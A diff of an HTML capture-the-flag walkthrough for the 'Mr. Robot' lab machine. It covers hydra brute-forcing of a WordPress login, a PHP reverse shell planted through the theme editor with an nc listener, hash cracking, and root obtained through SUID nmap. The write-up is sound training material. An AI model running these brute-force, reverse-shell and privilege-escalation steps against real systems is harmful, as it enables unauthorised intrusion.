@@ -1,84 +1,128 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Mr. Robot CTF Writeup</title>
-  <link rel="stylesheet" href="../css/style.css" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Mr. Robot Walkthrough | Axoryn</title>
+  <link rel="stylesheet" href="https://axoryn.github.io/style.css">
+  <style>
+    body {
+      font-family: monospace;
+      background-color: #0d0d0d;
+      color: #f2f2f2;
+      padding: 2rem;
+    }
+    code, pre {
+      background-color: #1a1a1a;
+      padding: 0.5em;
+      border-radius: 4px;
+      overflow-x: auto;
+    }
+    img {
+      max-width: 100%;
+      border: 1px solid #333;
+      margin: 1em 0;
+    }
+    h1, h2, h3 {
+      color: #00ffcc;
+    }
+    a {
+      color: #00ffff;
+    }
+  </style>
 </head>
 <body>
-  <h1>Mr. Robot CTF Writeup</h1>
 
-  <div class="meta-box">
-    <p><strong>Machine Name:</strong> Mr. Robot</p>
-    <p><strong>Difficulty:</strong> Beginner Friendly</p>
-    <p><strong>Goal:</strong> Root the machine</p>
-    <p><strong>OS:</strong> Linux</p>
-  </div>
+<h1>Mr. Robot CTF Walkthrough</h1>
+<p><strong>Target IP used:</strong> 10.10.99.69</p>
 
-  <h2>NMAP</h2>
-  <pre><code>PORT    STATE  SERVICE  VERSION
+<h2>Nmap Scan</h2>
+<pre><code>PORT    STATE  SERVICE  VERSION
 22/tcp  closed ssh
 80/tcp  open   http     Apache httpd
 443/tcp open   ssl/http Apache httpd
 </code></pre>
 
-  <h2>Enumerating HTTP and HTTPS</h2>
-  <!-- img src="../assets/mrrobot/robots.txt.png" alt="robots.txt contents" -->
-  <p>Interacting with these didn’t do anything.</p>
+<p>Ports 80 and 443 are open. Let's investigate further.</p>
 
-  <!-- img src="../assets/mrrobot/robots.txt.png" alt="robots.txt contents" -->
-  <p>Found first key and a wordlist in robots.txt</p>
+<h2>Exploring HTTP/HTTPS</h2>
+<p>Browsing the site didn’t give much, but <code>robots.txt</code> revealed:</p>
 
-  <pre><code>wget http://10.10.99.69/fsocity.dic</code></pre>
+<pre><code>User-agent: *
+fsocity.dic
+key-1-of-3.txt
+</code></pre>
 
-  <h2>Discovering Wordpress</h2>
-  <!-- img src="../assets/mrrobot/gobuster.png" alt="gobuster output" -->
+<p>We downloaded the dictionary:</p>
+<pre><code>wget http://10.10.99.69/fsocity.dic</code></pre>
 
-  <pre><code>cat fsocity.dic | grep angela</code></pre>
+<p>It had many duplicate entries. We cleaned it:</p>
+<pre><code>sort fsocity.dic | uniq -d > clean-dic.txt</code></pre>
 
-  <p>Remove duplicates:</p>
-  <pre><code>sort fsocity.dic | uniq -d > clean-dic.txt</code></pre>
+<h2>Directory Brute Force</h2>
+<p>Using <code>gobuster</code> revealed it's a WordPress site:</p>
 
-  <!-- img src="../assets/mrrobot/wp-login.png" alt="WordPress login page" -->
+<pre><code>/wp-content
+/admin
+/audio
+/intro
+</code></pre>
 
-  <h2>Username Enumeration</h2>
-  <!-- img src="../assets/mrrobot/elliot.png" alt="Valid username elliot" -->
+<h2>Username Enumeration</h2>
+<p>Visited <code>/wp-login.php</code> and tried usernames:</p>
+<img src="images/username-enum.png" alt="Username Enumeration">
 
-  <h2>Brute Force Login</h2>
-  <pre><code>hydra -L clean-dic.txt -p test &lt;target-ip&gt; http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=Invalid username"</code></pre>
+<p>We confirmed <code>elliot</code> exists:</p>
+<img src="images/elliot-valid.png" alt="Valid Username">
 
-  <p>Valid credentials: <code>elliot:XXXXXXX</code></p>
+<h2>Hydra Brute Force</h2>
+<pre><code>hydra -L clean-dic.txt -p test 10.10.99.69 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"</code></pre>
 
-  <!-- img src="../assets/mrrobot/theme-editor.png" alt="Theme editor access" -->
+<p>Found valid creds:</p>
+<pre><code>elliot:XXXXXXX</code></pre>
 
-  <h2>Reverse Shell</h2>
-  <p>Used <a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey reverse shell</a>.</p>
+<h2>Theme Editor RCE</h2>
+<p>Logged into WP admin, went to Appearance → Theme Editor:</p>
+<img src="images/theme-editor.png" alt="Theme Editor">
 
-  <pre><code>nc -lvnp 1337</code></pre>
+<p>Edited 404 template with a reverse shell:</p>
+<a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">pentestmonkey/php-reverse-shell</a>
 
-  <!-- img src="../assets/mrrobot/shell-access.png" alt="Shell access as daemon" -->
+<img src="images/shell-upload.png" alt="Reverse Shell Upload">
 
-  <h2>Privilege Escalation</h2>
-  <!-- img src="../assets/mrrobot/robot-home.png" alt="Robot user's home directory" -->
+<pre><code>nc -lvnp 1337</code></pre>
 
-  <p>Found a hash, cracked it on <a href="https://crackstation.net">CrackStation</a>.</p>
+<h2>Initial Shell: daemon</h2>
+<pre><code>uid=1(daemon) gid=1(daemon)</code></pre>
 
-  <!-- img src="../assets/mrrobot/cracked-password.png" alt="Cracked password for robot" -->
+<h2>Privilege Escalation to robot</h2>
+<pre><code>$ cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+</code></pre>
 
-  <!-- img src="../assets/mrrobot/second-key.png" alt="Second key obtained" -->
+<p>Cracked with <a href="https://crackstation.net" target="_blank">Crackstation</a>:</p>
+<img src="images/crackstation-result.png" alt="Crackstation Output">
 
-  <h2>Root.txt</h2>
-  <!-- img src="../assets/mrrobot/suid-binaries.png" alt="SUID binaries found" -->
+<pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
 
-  <p>Nmap was a SUID binary. Exploited via GTFOBins.</p>
+<h2>Escalating to Root</h2>
+<pre><code>find / -perm -u=s -type f 2>/dev/null</code></pre>
 
-  <!-- img src="../assets/mrrobot/gtfo-nmap.png" alt="GTFOBins nmap exploit" -->
+<p><code>/usr/local/bin/nmap</code> was SUID!</p>
 
-  <!-- img src="../assets/mrrobot/root-access.png" alt="Root access achieved" -->
+<img src="images/gtfobins-nmap.png" alt="GTFOBins Nmap Exploit">
 
-  <p>✅ Root access achieved!</p>
+<pre><code>
+nmap --interactive
+!sh
+whoami → root
+</code></pre>
 
-  <p><a href="../index.html">← Back to Home</a></p>
+<h2>✔ Final Flag</h2>
+<p>Read <code>/root/key-3-of-3.txt</code> and pwned the box!</p>
+
+<hr>
+<p><strong>Written by:</strong> <a href="https://axoryn.github.io">Axoryn</a></p>
+
 </body>
 </html>
